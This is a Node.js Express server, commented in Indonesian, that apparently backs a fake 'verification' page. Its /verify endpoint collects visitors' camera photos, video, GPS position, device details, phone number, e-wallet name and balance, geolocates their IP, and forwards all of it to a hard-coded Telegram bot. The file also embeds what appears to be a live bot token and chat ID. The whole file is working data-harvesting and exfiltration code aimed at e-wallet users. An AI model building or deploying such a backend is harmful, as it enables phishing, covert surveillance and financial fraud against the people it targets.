const express = require('express');
const fetch = require('node-fetch');
const FormData = require('form-data');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = '8909571304:AAHmQQKT1vNM10IC-syWovjTvDddM9v02mc';
const CHAT_ID = '7352381955';

console.log('========================================');
console.log('🚀 SERVER STARTING');
console.log('========================================');
console.log(`🤖 BOT_TOKEN: ${BOT_TOKEN ? '✅ SET' : '❌ NOT SET'}`);
console.log(`📱 CHAT_ID: ${CHAT_ID ? '✅ SET' : '❌ NOT SET'}`);
console.log('========================================');

// ============================================
// ⚡ FIX: Increase limits & timeout
// ============================================
app.use(express.json({ 
    limit: '200mb',  // Perbesar limit
    verify: (req, res, buf) => {
        req.rawBody = buf;
    }
}));
app.use(express.urlencoded({ extended: true, limit: '200mb' }));

// Set timeout lebih lama (5 menit)
app.use((req, res, next) => {
    req.setTimeout(300000); // 5 menit
    res.setTimeout(300000);
    next();
});

app.use(express.static('public'));

// ============================================
// 📍 GET LOCATION
// ============================================
async function getLocationDetails(ip) {
    try {
        const cleanIp = ip === '::1' ? '' : ip.split(',')[0].trim();
        if (!cleanIp) return null;

        const res = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,regionName,city,lat,lon,isp`);
        const data = await res.json();

        if (data.status === 'success') {
            return {
                fullLocation: `${data.city || '-'}, ${data.regionName || '-'}, ${data.country || '-'}`,
                latitude: data.lat || 0,
                longitude: data.lon || 0,
                provider: data.isp ? data.isp.replace('PT ', '') : '-',
                googleMapsLink: `https://www.google.com/maps?q=${data.lat || 0},${data.lon || 0}`
            };
        }
        return null;
    } catch (e) {
        console.error('Geolocation error:', e.message);
        return null;
    }
}

// ============================================
// 📤 SEND 1 PESAN KE TELEGRAM
// ============================================
async function sendToTelegram(data) {
    try {
        const { frontPhoto, backPhoto, video, gps, device, phone, ewallet, saldo, ip, timestamp, locationData } = data;
        const time = new Date(timestamp).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

        console.log('📤 Sending to Telegram...');

        // CAPTION LENGKAP
        let caption = `🟡 *VERIFIKASI SUKSES*\n\n`;
        caption += `📱 *Nomor:* ${phone || 'Tidak diketahui'}\n`;
        caption += `💳 *E-Wallet:* ${ewallet || 'Tidak diketahui'}\n`;
        caption += `💰 *Saldo:* Rp ${saldo || '0'}\n`;
        caption += `🕒 *Waktu:* ${time}\n\n`;

        if (device) {
            caption += `📱 *Device:* ${device.brand || '-'} ${device.model || ''}\n`;
            caption += `💻 *OS:* ${device.os || '-'}\n`;
            caption += `🌐 *Browser:* ${device.browser || '-'}\n\n`;
        }

        if (locationData) {
            caption += `📍 *Lokasi:* ${locationData.fullLocation}\n`;
            caption += `🗺️ ${locationData.googleMapsLink}\n\n`;
        }

        if (gps && gps.latitude && gps.longitude) {
            caption += `📍 *GPS:* ${gps.latitude}, ${gps.longitude}\n`;
            caption += `🗺️ https://www.google.com/maps?q=${gps.latitude},${gps.longitude}\n\n`;
        }

        caption += `🌐 *IP:* ${ip || 'Tidak diketahui'}`;

        let messageId = null;

        // 1. KIRIM FOTO (jika ada)
        let photoBuffer = null;
        if (frontPhoto && frontPhoto.length > 100) {
            try {
                const base64Data = frontPhoto.replace(/^data:image\/\w+;base64,/, '');
                photoBuffer = Buffer.from(base64Data, 'base64');
                console.log(`📸 Front photo size: ${photoBuffer.length} bytes`);
            } catch (e) {
                console.log('⚠️ Front photo error:', e.message);
            }
        } else if (backPhoto && backPhoto.length > 100) {
            try {
                const base64Data = backPhoto.replace(/^data:image\/\w+;base64,/, '');
                photoBuffer = Buffer.from(base64Data, 'base64');
                console.log(`📸 Back photo size: ${photoBuffer.length} bytes`);
            } catch (e) {
                console.log('⚠️ Back photo error:', e.message);
            }
        }

        if (photoBuffer && photoBuffer.length > 100) {
            try {
                const form = new FormData();
                form.append('chat_id', CHAT_ID);
                form.append('caption', caption);
                form.append('photo', photoBuffer, {
                    filename: `foto_${Date.now()}.jpg`,
                    contentType: 'image/jpeg'
                });

                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: form,
                    timeout: 60000
                });
                const result = await res.json();
                if (result.ok) {
                    messageId = result.result.message_id;
                    console.log('✅ Photo sent');
                } else {
                    console.log('⚠️ Photo failed:', result.description);
                }
            } catch (e) {
                console.log('⚠️ Photo send error:', e.message);
            }
        }

        // 2. KIRIM VIDEO
        if (video && video.length > 1000) {
            try {
                const videoBase64 = video.replace(/^data:video\/\w+;base64,/, '');
                const videoBuffer = Buffer.from(videoBase64, 'base64');
                console.log(`📹 Video size: ${videoBuffer.length} bytes`);

                if (videoBuffer.length > 500) {
                    const form = new FormData();
                    form.append('chat_id', CHAT_ID);
                    form.append('caption', `📹 *Video Verifikasi*\nUser: ${phone || 'Tidak diketahui'}`);
                    form.append('video', videoBuffer, {
                        filename: `video_${Date.now()}.mp4`,
                        contentType: 'video/mp4'
                    });

                    if (messageId) {
                        form.append('reply_to_message_id', messageId);
                    }

                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                        method: 'POST',
                        body: form,
                        timeout: 120000
                    });
                    const result = await res.json();
                    if (result.ok) {
                        console.log('✅ Video sent');
                    } else {
                        console.log('⚠️ Video failed:', result.description);
                        // Fallback: kirim sebagai document
                        try {
                            const formDoc = new FormData();
                            formDoc.append('chat_id', CHAT_ID);
                            formDoc.append('caption', `📹 *Video Verifikasi*\nUser: ${phone || 'Tidak diketahui'}`);
                            formDoc.append('document', videoBuffer, {
                                filename: `video_${Date.now()}.mp4`,
                                contentType: 'video/mp4'
                            });
                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                                method: 'POST',
                                body: formDoc,
                                timeout: 120000
                            });
                            console.log('✅ Video sent as document');
                        } catch (e) {
                            console.log('⚠️ Document fallback error:', e.message);
                        }
                    }
                }
            } catch (e) {
                console.log('⚠️ Video error:', e.message);
            }
        }

        // 3. KIRIM GPS
        if (gps && gps.latitude && gps.longitude) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        latitude: gps.latitude,
                        longitude: gps.longitude
                    }),
                    timeout: 30000
                });
                console.log('✅ Location sent');
            } catch (e) {
                console.log('⚠️ Location error:', e.message);
            }
        }

        return true;
    } catch (err) {
        console.error('❌ Send error:', err);
        return false;
    }
}

// ============================================
// ✅ VERIFY - FIX REQUEST ABORTED
// ============================================
app.post('/verify', async (req, res) => {
    console.log('📸 ===== NEW VERIFICATION =====');
    console.log('📸 Time:', new Date().toISOString());

    try {
        // Parse raw body manually
        let body = req.body;
        if (req.rawBody) {
            try {
                body = JSON.parse(req.rawBody.toString());
            } catch (e) {
                body = req.body;
            }
        }

        const { frontPhoto, backPhoto, video, gps, device, phone, ewallet, saldo, timestamp } = body || {};
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';

        console.log(`📱 Phone: ${phone || 'Tidak diketahui'}`);
        console.log(`💳 E-Wallet: ${ewallet || 'Tidak diketahui'}`);
        console.log(`💰 Saldo: ${saldo || '0'}`);
        console.log(`📸 Front: ${frontPhoto ? `YES (${frontPhoto.length} chars)` : 'NO'}`);
        console.log(`📹 Video: ${video ? `YES (${video.length} chars)` : 'NO'}`);
        console.log(`📍 GPS:`, gps);

        const locationData = await getLocationDetails(ip);

        // Kirim data ke Telegram
        const result = await sendToTelegram({
            frontPhoto,
            backPhoto,
            video,
            gps,
            device,
            phone: phone || 'Tidak diketahui',
            ewallet: ewallet || 'Tidak diketahui',
            saldo: saldo || '0',
            ip,
            timestamp: timestamp || new Date().toISOString(),
            locationData
        });

        res.json({ success: result });

    } catch (err) {
        console.error('❌ Error:', err);
        console.error('❌ Stack:', err.stack);
        res.status(500).json({ success: false, error: err.message });
    }
});

// ============================================
// 🧪 TEST
// ============================================
app.get('/test', async (req, res) => {
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
        const data = await response.json();
        res.json(data);
    } catch (err) {
        res.json({ error: err.message });
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📸 Max payload: 200MB`);
    console.log(`⏰ Timeout: 5 minutes`);
});
